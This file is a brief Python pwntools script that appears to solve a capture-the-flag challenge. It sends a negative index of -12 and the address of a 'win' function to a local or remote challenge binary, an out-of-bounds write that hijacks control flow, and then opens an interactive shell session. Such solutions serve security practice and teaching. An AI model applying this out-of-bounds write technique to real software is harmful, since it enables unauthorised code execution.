#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./chall")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("34.170.146.252", 25071)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    payload1 = b""
    payload1 += str(-12).encode()

    payload2 = b""
    payload2 += str(0x4011B6).encode()  # win
    payload2 += b"\x00" * 8
    payload2 += b"A" * 40

    io.sendlineafter("index: ", payload1)
    io.sendlineafter("value: ", payload2)

    io.interactive()
    return


if __name__ == "__main__":
    main()
